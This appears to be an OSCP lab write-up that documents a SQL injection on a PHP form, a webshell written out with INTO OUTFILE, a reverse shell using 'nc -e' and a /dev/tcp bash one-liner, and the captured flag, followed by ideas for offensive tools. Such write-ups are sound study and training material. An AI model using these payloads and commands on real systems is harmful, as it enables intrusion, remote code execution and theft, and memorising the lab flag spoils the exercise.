# 🌲 PROGRESSION TREE - Chapter 10 Capstone 2
**Target**: 192.168.145.48 (animal-world)
**Date**: 2025-10-01
**Total Time**: ~2 hours (including documentation)
**Flag**: `OS{c7956b8848527f9443bdfbf1d125ef1f}`

---

## 🎯 Attack Flow Decision Tree

```
[START] Port Scan (192.168.145.48)
    |
    ├─[22/SSH] OpenSSH 7.9p1
    │   └─[DEAD END] No credentials
    │
    ├─[3306/MySQL] Direct connection
    │   └─[FAILED] "Host not allowed to connect"
    │       └─[LEARNING] Need web-based attack vector
    │
    └─[80/HTTP] Nginx 1.14.2 + PHP
        |
        ├─[CVE Research] Nginx 1.14.2
        │   └─[CVE-2019-20372] Request smuggling
        │       └─[DEPRIORITIZED] Requires specific config
        │
        └─[Web Enumeration]
            |
            ├─[Directory Discovery] /css, /images, /js
            │   └─[NO VALUE] Static assets only
            │
            ├─[Page Discovery] index.php, about.php, donate.php
            │   └─[FOCUS] index.php has forms
            │
            └─[Parameter Extraction] HTML parsing
                |
                ├─[Search Form] Line 39
                │   └─[DEAD END] No name attribute on input
                │
                ├─[Contact Form] Line 252
                │   └─[DEAD END] Empty action, no inputs
                │
                └─[Subscribe Form] Line 300
                    ├─[Parameter Found] name="mail-list"
                    ├─[Method] POST
                    └─[Injection Test] Add single quote
                        └─[SQL ERROR!] 🎯 Vulnerable!
                        |
                        ├─[Column Enumeration]
                        │   ├─[UNION SELECT] "Different number of columns"
                        │   └─[ORDER BY 7] Error = 6 columns ✓
                        │
                        ├─[SQLMap Discovery]
                        │   ├─[Time-based blind] Too slow
                        │   └─[USER: gollum@localhost]
                        │       └─[FILE PRIVILEGE!] 🔥
                        │
                        └─[Manual Exploitation]
                            |
                            ├─[File Write Test]
                            │   ├─[/tmp/] ✗ Not web accessible
                            │   ├─[/var/tmp/] ✗ Not web accessible
                            │   └─[/var/www/html/] ✓ WRITABLE!
                            │
                            └─[Webshell Deployment]
                                |
                                ├─[Complex PHP shells] ✗ Quote escaping issues
                                ├─[Python in PHP] ✗ 404 errors
                                └─[Simple cmd shell] ✓ SUCCESS!
                                    |
                                    └─[Reverse Shell]
                                        ├─[bash -i] ✗ No connection
                                        ├─[Python] ✗ Path issues
                                        └─[nc -e] ✓ Shell as www-data
                                            |
                                            └─[Flag Discovery]
                                                └─[find /var] → /var/www/flag.txt
```

---

## 📊 Stage-by-Stage Breakdown

### Stage 1: Initial Reconnaissance (15 min)
**Decision Point**: Which service to target?

```bash
# Full TCP scan
nmap -sV -sC -p- -T4 192.168.45.179 --min-rate 1000 -oA initial_scan
# -sV: Version detection
# -sC: Default scripts
# -p-: All 65535 ports
# -T4: Aggressive timing
# --min-rate: Minimum packets/sec
# Time: ~2-3 minutes
```

**Thinking**: Port 80 most likely vector. MySQL blocked remotely. SSH needs creds.

---

### Stage 2: Web Enumeration (10 min)
**Decision Point**: Attack surface identification

```bash
# Technology fingerprinting
whatweb http://192.168.145.48 -v
# -v: Verbose output showing all detected technologies

# Directory discovery
gobuster dir -u http://192.168.145.48 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
# -w: Wordlist path
# -x: File extensions to test
# Result: /index.php, /about.php, /donate.php
```

**Thinking**: Limited attack surface (3 PHP files). Need to find input points.

---

### Stage 3: Form & Parameter Discovery (10 min)
**Decision Point**: What parameters accept user input?

```bash
# Method 1: Extract forms from HTML
curl -s http://192.168.145.48/index.php | grep -E '<form|<input|<textarea|<select' -A 3
# -s: Silent mode
# -E: Extended regex
# -A 3: Show 3 lines after match

# Method 2: More targeted form extraction
curl -s http://192.168.145.48/index.php | \
  sed -n '/<form/,/<\/form>/p' | \
  grep -E 'name=|id=|action=|method='
# Extract everything between form tags
# Show parameter names and methods

# Method 3: Quick parameter extraction
curl -s http://192.168.145.48/index.php | \
  grep -oP '(name|id)="[^"]*"' | sort -u
# -o: Only matching
# -P: Perl regex
# Result found: name="mail-list"

# Method 4: Interactive inspection
curl -s http://192.168.145.48/index.php > page.html
grep -n "form" page.html
# Line 39: Search form (no name attribute - DEAD END)
# Line 252: Empty action form (no inputs - DEAD END)
# Line 300: Subscribe form with mail-list parameter! TARGET!
```

**Forms Discovered**:
1. **Search Form** (line 39): Missing name attribute on input - unusable
2. **Contact Form** (line 252): Empty action, no actual inputs
3. **Subscribe Form** (line 300): POST to index.php with `mail-list` parameter ✓

**Parameter Testing Plan**:
```bash
# Create parameter list from discovery
echo "mail-list" > params.txt

# If more parameters existed, we'd test each:
while read param; do
  echo "Testing $param..."
  curl -X POST http://192.168.145.48/index.php \
    -d "$param=test'" -s | grep -q error && \
    echo "[!] $param is vulnerable!"
done < params.txt
```

**Thinking**: Only one valid parameter found: mail-list. Test it for injection.

---

### Stage 4: SQL Injection Discovery (5 min)
**Decision Point**: Is the mail-list parameter vulnerable?

```bash
# Test 1: Single quote
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com'" -s | grep -i error
# Result: "You have an error in your SQL syntax"
# VULNERABLE! Error-based SQLi confirmed

# Test 2: Comment injection
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com'-- -" -s | grep -i error
# No error = comment worked

# Test 3: Boolean-based
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND '1'='1" -s | md5sum
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND '1'='2" -s | md5sum
# Different hashes = Boolean-based works

# Test 4: Time-based
time curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND SLEEP(3)-- -" -s -o /dev/null
# 3+ second delay = Time-based works
```

**Thinking**: Error-based SQLi confirmed. This is fastest method. Need column count for UNION.

---

### Stage 5: Column Enumeration (5 min)
**Decision Point**: How many columns for UNION?

```bash
# Binary search with ORDER BY
for i in {1..10}; do
  echo -n "Testing $i columns: "
  curl -X POST http://192.168.145.48/index.php \
    -d "mail-list=test@test.com' ORDER BY $i-- -" -s | grep -q "Unknown column" && \
    echo "Failed at $i - Previous was valid" && break || echo "OK"
done
# Result: 6 columns
```

**Failed Attempt**:
```bash
# UNION without column count
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT 'test'-- -"
# Error: "Different number of columns"
# Lesson: Always enumerate columns first
```

---

### Stage 6: Privilege Discovery (30 min)
**Decision Point**: What can we do with SQLi?

```bash
# SQLMap enumeration (automated but slow)
sqlmap -u http://192.168.145.48/index.php --data=mail-list=test@test.com \
  --dbms=mysql --technique=T --batch --current-user --privileges \
  --output-dir=./sqlmap_user_audit
# --technique=T: Time-based blind only
# --batch: Non-interactive mode
# Result: gollum@localhost with FILE privilege!
```

**Thinking**: FILE privilege = can read/write files = potential RCE!

---

### Stage 7: Writable Directory Discovery (10 min)
**Decision Point**: Where can we write files?

```bash
# Test common web directories
dirs=("/var/www/html/" "/tmp/" "/var/tmp/" "/dev/shm/")
for dir in "${dirs[@]}"; do
  echo "Testing $dir..."
  curl -X POST http://192.168.145.48/index.php \
    -d "mail-list=test' UNION SELECT 'TEST',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '${dir}test.txt'-- -" \
    -s -o /dev/null -w "%{http_code}\n"
done
# Result: /var/www/html/ writable!
```

**Verification**:
```bash
curl http://192.168.145.48/test.txt
# Output: TEST	\N	\N	\N	\N	\N
# Success: File written and accessible!
```

---

### Stage 8: Webshell Deployment (5 min)
**Decision Point**: Which webshell type?

**Failed Attempts**:
```bash
# Complex PHP reverse shell - FAILED (quote escaping)
PAYLOAD='<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\""); ?>'

# Python in PHP - FAILED (404 error)
PAYLOAD='<?php system("python -c \"import socket...\""); ?>'
```

**Successful Method**:
```bash
# Simple command execution shell
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/cmd.php'-- -"
# --data-urlencode: Handles special characters
# Escaping: \$ for literal $, \" for quotes in shell

# Test webshell
curl "http://192.168.145.48/cmd.php?c=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Stage 9: Reverse Shell (5 min)
**Decision Point**: Which reverse shell method?

```bash
# Find correct VPN IP
ip addr show tun0 | grep inet | awk '{print $2}' | cut -d'/' -f1
# Result: 192.168.45.179

# Start listener
nc -lvnp 443
# -l: Listen mode
# -v: Verbose
# -n: No DNS resolution
# -p: Port number

# Trigger reverse shell
curl -G "http://192.168.145.48/cmd.php" \
  --data-urlencode "c=nc -e /bin/bash 192.168.45.179 443"
# -G: GET with data
# -e: Execute command on connection
```

---

### Stage 10: Shell Upgrade & Flag (5 min)
**Decision Point**: How to find the flag?

```bash
# Upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")'
# Creates pseudo-TTY for better interaction

# Search for flag
find /var -name "*flag*" 2>/dev/null
# Result: /var/www/flag.txt

# Capture flag
cat /var/www/flag.txt
# Flag: OS{c7956b8848527f9443bdfbf1d125ef1f}
```

---

## 🔧 Troubleshooting Guide

### Problem: "Different number of columns" error
**Solution**: Use ORDER BY to find exact count before UNION
```bash
# Incremental test
for i in {1..20}; do
  curl -X POST $TARGET -d "mail-list=test' ORDER BY $i-- -" -s | \
  grep -q "Unknown" && echo "Columns: $((i-1))" && break
done
```

### Problem: Webshell writes but returns 404
**Cause**: Complex quotes breaking SQL syntax
**Solution**: Use simpler payload, URL-encode properly
```bash
# Bad: Complex nested quotes
'<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\""); ?>'

# Good: Simple execution
'<?php system($_GET["c"]); ?>'
```

### Problem: No reverse shell connection
**Checklist**:
1. Verify LHOST is VPN IP: `ip addr show tun0`
2. Check listener is running: `netstat -tlpn | grep 443`
3. Try different ports: 443, 4444, 8080
4. Try different methods: nc, bash, python, perl

### Problem: SQLMap too slow (time-based blind)
**Alternative**: Use FILE privilege for faster extraction
```bash
# Write query results to file
curl -X POST $TARGET --data-urlencode \
  "mail-list=' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL,NULL,NULL \
  FROM information_schema.tables INTO OUTFILE '/var/www/html/tables.txt'-- -"

# Read results directly
curl http://$TARGET/tables.txt
```

---

## 🛠️ CLI Tool Ideas for OSCP Exam

### 🔴 Critical Tools (Build First)

#### 1. `sqli-column-finder`
**Complexity**: Simple (50 lines)
**Value**: Critical - saves 10+ minutes per SQLi
**Description**: Auto-detects column count using ORDER BY and UNION methods in parallel. Handles both error-based and blind scenarios.
```
Features:
- Concurrent ORDER BY and UNION testing
- Auto-detects error patterns
- Returns exact column count with NULL padding
```

#### 2. `file-write-scanner`
**Complexity**: Simple (75 lines)
**Value**: Critical - finds RCE vectors quickly
**Description**: Tests common web directories for MySQL FILE write permissions via SQLi.
```
Features:
- Tests 20+ common directories
- Verifies write AND web access
- Auto-generates test filenames
- Cleanup after testing
```

#### 3. `webshell-deployer`
**Complexity**: Medium (100 lines)
**Value**: Critical - handles escaping issues
**Description**: Deploys various webshell types with proper escaping for different SQL contexts.
```
Features:
- Multiple shell templates (cmd, upload, full)
- Auto-handles quote escaping
- Tests deployment success
- Generates random filenames
```

---

### 🟡 High-Value Tools

#### 4. `reverse-shell-generator`
**Complexity**: Medium (150 lines)
**Value**: High - covers multiple scenarios
**Description**: Generates reverse shells for all common languages/methods with proper encoding.
```
Features:
- 10+ shell types (bash, nc, python, perl, php, ruby)
- Auto-detects available interpreters
- URL encoding for web delivery
- Listener setup commands
```

#### 5. `blind-sqli-extractor`
**Complexity**: Complex (200+ lines)
**Value**: High - 10x faster than manual
**Description**: Optimized binary search for time-based blind SQLi with parallel extraction.
```
Features:
- Concurrent character extraction
- Adaptive timing calibration
- Progress visualization
- Resume capability
```

#### 6. `privilege-enumerator`
**Complexity**: Medium (100 lines)
**Value**: High - finds exploitation paths
**Description**: Checks MySQL user privileges via SQLi and suggests attack vectors.
```
Features:
- Tests FILE, SUPER, CREATE privileges
- Suggests specific exploits per privilege
- Tests actual capability vs reported
```

---

### 🟢 Moderate-Value Tools

#### 7. `mysql-file-reader`
**Complexity**: Medium (100 lines)
**Value**: Moderate - useful for config extraction
**Description**: Reads system files via LOAD_FILE() with chunking for large files.
```
Features:
- Common config file list
- Handles large files with chunking
- Base64 encoding for binary files
```

#### 8. `sqli-to-rce`
**Complexity**: Complex (300+ lines)
**Value**: Moderate - full automation risky
**Description**: Complete automation from SQLi discovery to reverse shell.
```
Features:
- Full chain automation
- Multiple fallback methods
- Detailed logging
- Manual override points
```

#### 9. `post-exploit-enum`
**Complexity**: Medium (150 lines)
**Value**: Moderate - saves enumeration time
**Description**: Automated enumeration after shell access.
```
Features:
- SUID/capability search
- Cron job enumeration
- Service enumeration
- Config file discovery
```

#### 10. `shell-upgrader`
**Complexity**: Simple (50 lines)
**Value**: Moderate - quality of life
**Description**: Upgrades basic shells to fully interactive TTY.
```
Features:
- Multiple upgrade methods
- Auto-detects best method
- Terminal size adjustment
- Readline support
```

---

### 🔵 Nice-to-Have Tools

#### 11. `sqli-query-builder`
**Complexity**: Medium (100 lines)
**Value**: Low - mainly convenience
**Description**: Interactive query builder for complex SQLi payloads.

#### 12. `error-pattern-detector`
**Complexity**: Simple (75 lines)
**Value**: Low - helps learning
**Description**: Identifies SQL error patterns and suggests injection points.

#### 13. `timing-calibrator`
**Complexity**: Simple (50 lines)
**Value**: Low - improves reliability
**Description**: Calibrates optimal sleep times for time-based blind SQLi.

#### 14. `payload-encoder`
**Complexity**: Simple (75 lines)
**Value**: Low - handles edge cases
**Description**: Multi-layer encoding for complex payloads (URL, hex, base64).

#### 15. `flag-hunter`
**Complexity**: Simple (30 lines)
**Value**: Low - saves 1-2 minutes
**Description**: Searches common flag locations with parallel find commands.

---

### 🔷 Parameter Discovery Tools

#### 16. `form-finder`
**Complexity**: Simple (75 lines)
**Value**: High - finds all input vectors quickly
**Description**: Extracts all forms and parameters from web pages with detailed metadata.
```
Features:
- Parses HTML for all form elements
- Identifies parameter names, types, methods
- Detects hidden fields and default values
- Outputs injection test commands
```

#### 17. `param-fuzzer`
**Complexity**: Medium (100 lines)
**Value**: High - discovers hidden parameters
**Description**: Tests for hidden/undocumented parameters that might be vulnerable.
```
Features:
- Tests common parameter names
- Method switching (GET/POST/PUT)
- Header injection points
- Cookie parameters
```

#### 18. `injection-scanner`
**Complexity**: Medium (150 lines)
**Value**: Critical - automates vulnerability discovery
**Description**: Tests all discovered parameters for multiple injection types.
```
Features:
- SQL injection (error/blind/time)
- Command injection
- XSS detection
- LDAP/XML injection
- Parallel testing for speed
```

---

## 📚 Key Lessons Learned

### 1. **Column Count is Mandatory**
Never attempt UNION without knowing exact columns. ORDER BY method is fastest.

### 2. **Simple Payloads Win**
Complex nested quotes often fail. Start simple, add complexity only if needed.

### 3. **FILE Privilege = Game Changer**
Transforms slow blind SQLi into fast file-based extraction and RCE.

### 4. **Verify Each Step**
Test file write before deploying shell. Test shell before reverse shell.

### 5. **Know Your Network**
Always verify VPN IP with `ip addr show tun0`. Wrong IP = no shell.

### 6. **Time-Based Blind is Last Resort**
If you have FILE privilege, use it to avoid slow extraction.

### 7. **Document Failed Attempts**
Failed complex shells taught us to use simple ones. Failures are valuable.

### 8. **Manual First, Automate Second**
Understanding manual process makes automation/debugging much easier.

---

## ⏱️ Time Budget for OSCP

| Phase | Time | Cumulative |
|-------|------|------------|
| Port scan | 3 min | 3 min |
| Web enum | 5 min | 8 min |
| Parameter discovery | 5 min | 13 min |
| SQLi testing | 2 min | 15 min |
| Column count | 2 min | 17 min |
| Privilege check | 5 min | 22 min |
| Write test | 5 min | 27 min |
| Webshell | 3 min | 30 min |
| Reverse shell | 2 min | 32 min |
| Flag search | 3 min | 35 min |
| **Total** | **35 min** | ✅ |

**Buffer for issues**: +15 min = 50 min total

---

## 🎬 Final Summary

**Attack Chain**: SQLi → FILE privilege → Webshell → Reverse Shell → Flag

**Critical Success Factors**:
1. Recognizing FILE privilege importance
2. Finding writable web directory
3. Using simple webshell to avoid escaping issues
4. Proper LHOST configuration

**What Made This Efficient**:
1. Skipping slow blind extraction after finding FILE privilege
2. Testing write ability before complex payload attempts
3. Using nc -e (simplest reverse shell)

**Exam Strategy**:
- If SQLi found, immediately check privileges (not just data)
- FILE privilege should redirect entire approach
- Have simple webshells ready (complex ones often fail)
- Test incrementally, verify each step works

---

**Documentation Complete**: Ready for exam reference! 🎯